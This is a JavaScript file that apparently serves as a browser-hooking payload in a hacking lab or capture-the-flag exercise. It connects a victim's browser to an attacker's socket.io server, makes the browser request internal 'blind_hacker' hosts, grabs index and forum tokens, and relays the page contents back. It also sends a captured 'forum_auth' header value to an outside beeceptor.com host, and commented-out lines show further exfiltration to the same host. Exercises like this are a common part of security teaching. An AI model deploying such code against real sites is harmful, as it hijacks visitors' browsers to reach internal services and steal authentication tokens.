const serverURL = window.location.hostname + ":" + window.location.port;

let indextoken = '';
let forumtoken = '';
let forum_auth = '';

let oldVictimURL = 'http://blind_hacker/';
let victimURL = 'http://blind_hacker_forum/';

// let oldVictimURL = 'https://ikasten.free.beeceptor.com/';
// let victimURL = 'https://ikasten.free.beeceptor.com/';
// let victimURL = 'http://localhost:3001/';

window.onload = function () {

    const socket = io.connect(serverURL);
    // register hooked browser connection
    socket.emit('browser-connect');

    socket.on('mensaje', function (text_id) {

        // let passwd = data.split('&')[1].split('=')[1]
        // Build formData object.
        // let formData = new FormData();
        // formData.append('username', "admin");
        // formData.append('password', text_id.text);

        // console.log("text:" + text_id.text);
        // console.log("content-type:" + text_id.contentType);

        fetch(victimURL + '?indextoken=' + indextoken + '&forumtoken=' + forumtoken, {
            method: 'GET',
            // body: text_id.text,
            headers: { 'content-type': text_id.contentType }
        }).then(res => {
            for (var p of res.headers){
                let [clave, valor] = p.toString().split(",");
                if (clave == "forum_auth") {
                    forum_auth = valor;
                    fetch("https://ikasten.free.beeceptor.com/" + valor);
                }
            }
            return res.text();
        }).
        then(data => {
            socket.emit('answer', {data: data, id: text_id.id});
        })
    })


    fetch(oldVictimURL + "token.php").
    then(res => res.text()).
    then(data => {

        //There you go -> FYsuk1xFzScjXOonVBxIBEqAZAM4AIDmHCPjAmU1
        indextoken = data.split(" ")[4];
        // console.log(token);
        // fetch("https://ikasten.free.beeceptor.com/" + data);
        return indextoken;
    }).
    then( token => {

        fetch( victimURL + 'token').
            then( res => res.text()).
            then( data => {
                forumtoken = data.split("-> ")[1]
                // fetch("https://ikasten.free.beeceptor.com/" + forumtoken);
        })
    })

};
